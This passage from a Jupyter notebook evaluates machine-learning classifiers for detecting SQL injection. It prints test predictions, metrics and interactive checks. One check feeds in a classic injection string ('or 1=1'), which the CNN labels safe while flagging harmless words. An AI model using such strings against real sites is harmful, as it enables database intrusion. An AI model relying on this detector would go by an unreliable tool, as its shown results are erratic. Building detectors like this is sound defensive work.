      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[False]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n"
     ]
    }
   ],
   "source": [
    "for i,j in zip(y_test,pred):\n",
    "    print(i==j)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Saving Model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 122,
   "metadata": {},
   "outputs": [],
   "source": [
    "from keras.models import load_model\n",
    "import pickle\n",
    "\n",
    "model.save('my_model_cnn.h5')\n",
    "with open('vectorizer_cnn', 'wb') as fin:\n",
    "    pickle.dump(vectorizer, fin)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Confusion Matrix\n",
    "#### Assumption:\n",
    "1. SQLI attack type is positive"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 123,
   "metadata": {},
   "outputs": [],
   "source": [
    "def accuracy_function(tp,tn,fp,fn):\n",
    "    \n",
    "    accuracy = (tp+tn) / (tp+tn+fp+fn)\n",
    "    \n",
    "    return accuracy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "metadata": {},
   "outputs": [],
   "source": [
    "def precision_function(tp,fp):\n",
    "    \n",
    "    precision = tp / (tp+fp)\n",
    "    \n",
    "    return precision"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "metadata": {},
   "outputs": [],
   "source": [
    "def recall_function(tp,fn):\n",
    "    \n",
    "    recall=tp / (tp+fn)\n",
    "    \n",
    "    return recall"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 126,
   "metadata": {},
   "outputs": [],
   "source": [
    "def confusion_matrix(truth,predicted):\n",
    "    \n",
    "    true_positive = 0\n",
    "    true_negative = 0\n",
    "    false_positive = 0\n",
    "    false_negative = 0\n",
    "    \n",
    "    for true,pred in zip(truth,predicted):\n",
    "        \n",
    "        if true == 1:\n",
    "            if pred == true:\n",
    "                true_positive += 1\n",
    "            elif pred != true:\n",
    "                false_negative += 1\n",
    "\n",
    "        elif true == 0:\n",
    "            if pred == true:\n",
    "                true_negative += 1\n",
    "            elif pred != true:\n",
    "                false_positive += 1\n",
    "            \n",
    "    accuracy=accuracy_function(true_positive, true_negative, false_positive, false_negative)\n",
    "    precision=precision_function(true_positive, false_positive)\n",
    "    recall=recall_function(true_positive, false_negative)\n",
    "    \n",
    "    return (accuracy,\n",
    "            precision,\n",
    "           recall)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 127,
   "metadata": {},
   "outputs": [],
   "source": [
    "accuracy,precision,recall=confusion_matrix(y_test,pred)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 128,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " For CNN \n",
      " Accuracy : 0.9227941176470589 \n",
      " Precision : 0.7966666666666666 \n",
      " Recall : 0.9122137404580153\n"
     ]
    }
   ],
   "source": [
    "print(\" For CNN \\n Accuracy : {0} \\n Precision : {1} \\n Recall : {2}\".format(accuracy, precision, recall))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 129,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " For Naive Bayes Accuracy : 0.9494485294117647 \n",
      " Precision : 0.8371335504885994 \n",
      " Recall : 0.9809160305343512\n"
     ]
    }
   ],
   "source": [
    "accuracy,precision,recall=confusion_matrix(y_test,pred_gnb)\n",
    "print(\" For Naive Bayes Accuracy : {0} \\n Precision : {1} \\n Recall : {2}\".format(accuracy, precision, recall))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 130,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " For SVM Accuracy : 0.8134191176470589 \n",
      " Precision : 1.0 \n",
      " Recall : 0.22519083969465647\n"
     ]
    }
   ],
   "source": [
    "accuracy,precision,recall=confusion_matrix(y_test,pred_svm)\n",
    "print(\" For SVM Accuracy : {0} \\n Precision : {1} \\n Recall : {2}\".format(accuracy, precision, recall))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 131,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " For KNN Accuracy : 0.8805147058823529 \n",
      " Precision : 0.7481203007518797 \n",
      " Recall : 0.7595419847328244\n"
     ]
    }
   ],
   "source": [
    "accuracy,precision,recall=confusion_matrix(y_test,pred_knn)\n",
    "print(\" For KNN Accuracy : {0} \\n Precision : {1} \\n Recall : {2}\".format(accuracy, precision, recall))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 132,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " For Decision Tree Accuracy : 0.8492647058823529 \n",
      " Precision : 0.6200980392156863 \n",
      " Recall : 0.9656488549618321\n"
     ]
    }
   ],
   "source": [
    "accuracy,precision,recall=confusion_matrix(y_test,pred_dt)\n",
    "print(\" For Decision Tree Accuracy : {0} \\n Precision : {1} \\n Recall : {2}\".format(accuracy, precision, recall))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Classifying user data\n",
    "\n",
    "     This cell is also in file user_Data_predict.py No need to run this cell"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 133,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "import keras\n",
    "from keras.models import load_model\n",
    "import pickle\n",
    "\n",
    "\n",
    "mymodel = tf.keras.models.load_model('my_model_cnn.h5')\n",
    "myvectorizer = pickle.load(open(\"vectorizer_cnn\", 'rb'))\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "def clean_data(input_val):\n",
    "\n",
    "    input_val=input_val.replace('\\n', '')\n",
    "    input_val=input_val.replace('%20', ' ')\n",
    "    input_val=input_val.replace('=', ' = ')\n",
    "    input_val=input_val.replace('((', ' (( ')\n",
    "    input_val=input_val.replace('))', ' )) ')\n",
    "    input_val=input_val.replace('(', ' ( ')\n",
    "    input_val=input_val.replace(')', ' ) ')\n",
    "    input_val=input_val.replace('1 ', 'numeric')\n",
    "    input_val=input_val.replace(' 1', 'numeric')\n",
    "    input_val=input_val.replace(\"'1 \", \"'numeric \")\n",
    "    input_val=input_val.replace(\" 1'\", \" numeric'\")\n",
    "    input_val=input_val.replace('1,', 'numeric,')\n",
    "    input_val=input_val.replace(\" 2 \", \" numeric \")\n",
    "    input_val=input_val.replace(' 3 ', ' numeric ')\n",
    "    input_val=input_val.replace(' 3--', ' numeric--')\n",
    "    input_val=input_val.replace(\" 4 \", ' numeric ')\n",
    "    input_val=input_val.replace(\" 5 \", ' numeric ')\n",
    "    input_val=input_val.replace(' 6 ', ' numeric ')\n",
    "    input_val=input_val.replace(\" 7 \", ' numeric ')\n",
    "    input_val=input_val.replace(\" 8 \", ' numeric ')\n",
    "    input_val=input_val.replace('1234', ' numeric ')\n",
    "    input_val=input_val.replace(\"22\", ' numeric ')\n",
    "    input_val=input_val.replace(\" 8 \", ' numeric ')\n",
    "    input_val=input_val.replace(\" 200 \", ' numeric ')\n",
    "    input_val=input_val.replace(\"23 \", ' numeric ')\n",
    "    input_val=input_val.replace('\"1', '\"numeric')\n",
    "    input_val=input_val.replace('1\"', '\"numeric')\n",
    "    input_val=input_val.replace(\"7659\", 'numeric')\n",
    "    input_val=input_val.replace(\" 37 \", ' numeric ')\n",
    "    input_val=input_val.replace(\" 45 \", ' numeric ')\n",
    "\n",
    "    return input_val\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "def predict_sqli_attack():\n",
    "    \n",
    "    repeat=True\n",
    "    \n",
    "    beautify=''\n",
    "    for i in range(20):\n",
    "        beautify+= \"=\"\n",
    "\n",
    "    print(beautify) \n",
    "    input_val=input(\"Give me some data to work on : \")\n",
    "    print(beautify)\n",
    "\n",
    "    \n",
    "    if input_val== '0':\n",
    "        repeat=False\n",
    "    \n",
    "    \n",
    "\n",
    "    input_val=clean_data(input_val)\n",
    "    input_val=[input_val]\n",
    "\n",
    "\n",
    "\n",
    "    input_val=myvectorizer.transform(input_val).toarray()\n",
    "    \n",
    "    input_val.shape=(1,64,64,1)\n",
    "\n",
    "    result=mymodel.predict(input_val)\n",
    "\n",
    "\n",
    "    print(beautify)\n",
    "    \n",
    "    \n",
    "    if repeat == True:\n",
    "        \n",
    "        if result>0.5:\n",
    "            print(\"ALERT :::: This can be SQL injection\")\n",
    "\n",
    "\n",
    "        elif result<=0.5:\n",
    "            print(\"It seems to be safe\")\n",
    "            \n",
    "        print(beautify)\n",
    "            \n",
    "        predict_sqli_attack()\n",
    "            \n",
    "    elif repeat == False:\n",
    "        print( \" Good Bye \")\n",
    "\n",
    " \n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 134,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "====================\n",
      "Give me some data to work on : cekidot baju ini 111\n",
      "====================\n",
      "====================\n",
      "ALERT :::: This can be SQL injection\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : maybe\n",
      "====================\n",
      "====================\n",
      "ALERT :::: This can be SQL injection\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : select\n",
      "====================\n",
      "====================\n",
      "ALERT :::: This can be SQL injection\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : \n",
      "====================\n",
      "====================\n",
      "ALERT :::: This can be SQL injection\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : 0\n",
      "====================\n",
      "====================\n",
      " Good Bye \n"
     ]
    }
   ],
   "source": [
    "# check for sql injection cheat sheet\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "predict_sqli_attack()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 136,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "====================\n",
      "Give me some data to work on : cekidot baju ini 111\n",
      "====================\n",
      "====================\n",
      "ALERT :::: This can be SQL injection\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : test\n",
      "====================\n",
      "====================\n",
      "It seems to be safe\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : maybe\n",
      "====================\n",
      "====================\n",
      "ALERT :::: This can be SQL injection\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : i will try\n",
      "====================\n",
      "====================\n",
      "ALERT :::: This can be SQL injection\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : example.com\n",
      "====================\n",
      "====================\n",
      "It seems to be safe\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : youtube.com\n",
      "====================\n",
      "====================\n",
      "It seems to be safe\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : youtube.com/?id=1\n",
      "====================\n",
      "====================\n",
      "It seems to be safe\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : cek\n",
      "====================\n",
      "====================\n",
      "ALERT :::: This can be SQL injection\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : 0\n",
      "====================\n",
      "====================\n",
      " Good Bye \n"
     ]
    }
   ],
   "source": [
    "# check for normal data\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "predict_sqli_attack()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 137,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "====================\n",
      "Give me some data to work on : cek\n",
      "====================\n",
      "====================\n",
      "ALERT :::: This can be SQL injection\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : done\n",
      "====================\n",
      "====================\n",
      "It seems to be safe\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : server is up\n",
      "====================\n",
      "====================\n",
      "It seems to be safe\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : select\n",
      "====================\n",
      "====================\n",
      "ALERT :::: This can be SQL injection\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : mywebsite.com/?user='matt'\n",
      "====================\n",
      "====================\n",
      "It seems to be safe\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : mywebsite.com/?user='matt'' or 1=1\n",
      "====================\n",
      "====================\n",
      "It seems to be safe\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : mywebsite.com/?user='matt''\n",
      "====================\n",
      "====================\n",
      "It seems to be safe\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : mywebsite.com/?website\n",
      "====================\n",
      "====================\n",
      "It seems to be safe\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : union\n",
      "====================\n",
      "====================\n",
      "It seems to be safe\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : cek\n",
      "====================\n",
      "====================\n",
      "ALERT :::: This can be SQL injection\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : index\n",
      "====================\n",
      "====================\n",
      "ALERT :::: This can be SQL injection\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : try\n",
      "====================\n",
      "====================\n",
      "ALERT :::: This can be SQL injection\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : try the new drink\n",
      "====================\n",
      "====================\n",
      "It seems to be safe\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : try\n",
      "====================\n",
      "====================\n",
      "ALERT :::: This can be SQL injection\n",
      "====================\n",
      "====================\n",
      "Give me some data to work on : 0\n",
      "====================\n",
      "====================\n",
      " Good Bye \n"
     ]
    }
   ],
   "source": [
    "predict_sqli_attack()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
